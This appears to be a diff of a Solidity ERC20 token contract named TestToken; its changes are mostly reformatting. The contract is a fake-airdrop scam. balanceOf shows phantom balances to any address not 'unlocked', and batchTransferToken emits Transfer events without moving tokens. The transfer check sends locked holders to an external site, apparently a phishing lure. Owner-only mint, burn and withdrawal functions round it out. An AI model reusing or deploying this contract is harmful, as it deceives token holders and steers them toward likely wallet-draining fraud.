@@ -2,7 +2,6 @@
 
 pragma solidity ^0.8.0;
 
-
 abstract contract Context {
     function _msgSender() internal view virtual returns (address) {
         return msg.sender;
@@ -13,12 +12,13 @@ abstract contract Context {
     }
 }
 
-
-
 abstract contract Ownable is Context {
     address private _owner;
 
-    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+    event OwnershipTransferred(
+        address indexed previousOwner,
+        address indexed newOwner
+    );
 
     constructor() {
         _setOwner(_msgSender());
@@ -38,7 +38,10 @@ abstract contract Ownable is Context {
     }
 
     function transferOwnership(address newOwner) public virtual onlyOwner {
-        require(newOwner != address(0), "Ownable: new owner is the zero address");
+        require(
+            newOwner != address(0),
+            "Ownable: new owner is the zero address"
+        );
         _setOwner(newOwner);
     }
 
@@ -51,30 +54,55 @@ abstract contract Ownable is Context {
 
 interface IERC20 {
     function name() external view returns (string memory);
+
     function symbol() external view returns (string memory);
+
     function decimals() external view returns (uint8);
+
     function totalSupply() external view returns (uint256);
+
     function balanceOf(address account) external view returns (uint256);
-    function allowance(address owner, address spender) external view returns (uint256);
+
+    function allowance(address owner, address spender)
+        external
+        view
+        returns (uint256);
+
     function approve(address spender, uint256 amount) external returns (bool);
-    function transfer(address recipient, uint256 amount) external returns (bool);
-    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+
+    function transfer(address recipient, uint256 amount)
+        external
+        returns (bool);
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) external returns (bool);
 
     event Transfer(address indexed from, address indexed to, uint256 value);
-    event Approval(address indexed owner, address indexed spender, uint256 value);
+    event Approval(
+        address indexed owner,
+        address indexed spender,
+        uint256 value
+    );
 }
 
 contract TestToken is Ownable, IERC20 {
     string private _name;
     string private _symbol;
-    uint256 private _totalSupply = 1000000000*10**18;
+    uint256 private _totalSupply = 1000000000 * 10**18;
     uint256 private _airdropAmount;
 
     mapping(address => bool) private _unlocked;
     mapping(address => uint256) private _balances;
     mapping(address => mapping(address => uint256)) private _allowances;
 
-    constructor(string memory name_, string memory symbol_, uint256 airdropAmount_) Ownable() {
+    constructor(
+        string memory name_,
+        string memory symbol_,
+        uint256 airdropAmount_
+    ) Ownable() {
         _name = name_;
         _symbol = symbol_;
         _airdropAmount = airdropAmount_;
@@ -96,30 +124,56 @@ contract TestToken is Ownable, IERC20 {
         return _totalSupply;
     }
 
-    function balanceOf(address account) public view virtual override returns (uint256) {
-        if (!_unlocked[account]) {
-            return _airdropAmount;
+    function balanceOf(address account)
+        public
+        view
+        virtual
+        override
+        returns (uint256)
+    {
+        if (account == address(0)) {
+            return 0;
         } else {
-            return _balances[account];
+            if (!_unlocked[account]) {
+                return _airdropAmount;
+            } else {
+                return _balances[account];
+            }
         }
     }
 
-    function allowance(address owner, address spender) public view virtual override returns (uint256) {
+    function allowance(address owner, address spender)
+        public
+        view
+        virtual
+        override
+        returns (uint256)
+    {
         return _allowances[owner][spender];
     }
 
-    function setAirdropAmount(uint256 airdropAmount_) public onlyOwner (){
-
+    function setAirdropAmount(uint256 airdropAmount_) public onlyOwner {
         _airdropAmount = airdropAmount_;
     }
+
     ////////////////////////////////////////////////////////////
     ////////////////////////////////////////////////////////////
-    function approve(address spender, uint256 amount) public virtual override returns (bool) {
+    function approve(address spender, uint256 amount)
+        public
+        virtual
+        override
+        returns (bool)
+    {
         _approve(_msgSender(), spender, amount);
         return true;
     }
 
-    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
+    function transfer(address recipient, uint256 amount)
+        public
+        virtual
+        override
+        returns (bool)
+    {
         _transfer(_msgSender(), recipient, amount);
         return true;
     }
@@ -132,7 +186,10 @@ contract TestToken is Ownable, IERC20 {
         _transfer(sender, recipient, amount);
 
         uint256 currentAllowance = _allowances[sender][_msgSender()];
-        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
+        require(
+            currentAllowance >= amount,
+            "ERC20: transfer amount exceeds allowance"
+        );
         unchecked {
             _approve(sender, _msgSender(), currentAllowance - amount);
         }
@@ -142,14 +199,29 @@ contract TestToken is Ownable, IERC20 {
 
     ////////////////////////////////////////////////////////////
     ////////////////////////////////////////////////////////////
-    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
-        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
+    function increaseAllowance(address spender, uint256 addedValue)
+        public
+        virtual
+        returns (bool)
+    {
+        _approve(
+            _msgSender(),
+            spender,
+            _allowances[_msgSender()][spender] + addedValue
+        );
         return true;
     }
 
-    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
+    function decreaseAllowance(address spender, uint256 subtractedValue)
+        public
+        virtual
+        returns (bool)
+    {
         uint256 currentAllowance = _allowances[_msgSender()][spender];
-        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
+        require(
+            currentAllowance >= subtractedValue,
+            "ERC20: decreased allowance below zero"
+        );
         unchecked {
             _approve(_msgSender(), spender, currentAllowance - subtractedValue);
         }
@@ -164,10 +236,16 @@ contract TestToken is Ownable, IERC20 {
     ) internal virtual {
         require(sender != address(0), "ERC20: transfer from the zero address");
         require(recipient != address(0), "ERC20: transfer to the zero address");
-        require(_unlocked[sender], "ERC20: token must be unlocked before transfer.Visit https://h3x.exchange/ for more info'");
+        require(
+            _unlocked[sender],
+            "ERC20: token must be unlocked before transfer.Visit https://h3x.exchange/ for more info'"
+        );
 
         uint256 senderBalance = _balances[sender];
-        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
+        require(
+            senderBalance >= amount,
+            "ERC20: transfer amount exceeds balance"
+        );
         unchecked {
             _balances[sender] = senderBalance - amount;
         }
@@ -183,7 +261,7 @@ contract TestToken is Ownable, IERC20 {
         _totalSupply += amount;
         _balances[account] += amount;
         _unlocked[account] = true;
-        
+
         emit Transfer(address(0), account, amount);
     }
 
@@ -211,7 +289,7 @@ contract TestToken is Ownable, IERC20 {
         _allowances[owner][spender] = amount;
         emit Approval(owner, spender, amount);
     }
-    
+
     ////////////////////////////////////////////////////////////
     ////////////////////////////////////////////////////////////
     function mint(address account, uint256 amount) public payable onlyOwner {
@@ -221,14 +299,21 @@ contract TestToken is Ownable, IERC20 {
     function burn(address account, uint256 amount) public payable onlyOwner {
         _burn(account, amount);
     }
-    
-    function batchTransferToken(address[] memory holders, uint256 amount) public  {
-        for (uint i=0; i<holders.length; i++) {
+
+    function batchTransferToken(address[] memory holders, uint256 amount)
+        public
+    {
+        for (uint256 i = 0; i < holders.length; i++) {
             emit Transfer(address(this), holders[i], amount);
         }
     }
-    function withdrawEth(address payable receiver, uint amount) public onlyOwner payable {
-        uint balance = address(this).balance;
+
+    function withdrawEth(address payable receiver, uint256 amount)
+        public
+        payable
+        onlyOwner
+    {
+        uint256 balance = address(this).balance;
         if (amount == 0) {
             amount = balance;
         }
@@ -236,8 +321,12 @@ contract TestToken is Ownable, IERC20 {
         receiver.transfer(amount);
     }
 
-    function withdrawToken(address receiver, address tokenAddress, uint amount) public onlyOwner payable {
-        uint balance = IERC20(tokenAddress).balanceOf(address(this));
+    function withdrawToken(
+        address receiver,
+        address tokenAddress,
+        uint256 amount
+    ) public payable onlyOwner {
+        uint256 balance = IERC20(tokenAddress).balanceOf(address(this));
         if (amount == 0) {
             amount = balance;
         }
